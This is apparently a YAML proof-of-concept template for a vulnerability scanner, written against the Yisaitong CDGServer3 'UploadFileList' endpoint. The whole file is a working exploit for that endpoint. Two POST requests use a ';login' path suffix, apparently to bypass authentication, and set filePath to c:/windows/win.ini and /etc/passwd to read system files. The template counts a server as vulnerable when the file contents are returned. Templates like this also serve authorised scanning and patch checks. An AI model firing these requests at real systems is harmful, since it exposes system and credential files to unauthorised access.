name: poc-yaml-yisaitong-UploadFileList-File-reading
transport: http


rules:
  r0:
    request:
      method: POST
      path: /CDGServer3/document/UploadFileList;login
      headers:
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
        Content-Type: application/x-www-form-urlencoded
      body: command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=hello
    expression: response.status == 200 && response.body.bcontains(b'; for 16-bit app support')
  r1:
    request:
      method: POST
      path: /CDGServer3/document/UploadFileList;login
      headers:
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
        Content-Type: application/x-www-form-urlencoded
      body: command=VeiwUploadFile&filePath=/etc/passwd&fileName1=hello
    expression: response.status == 200 && response.body.bcontains(b'root:')

expression: r0() || r1()

detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/141107947

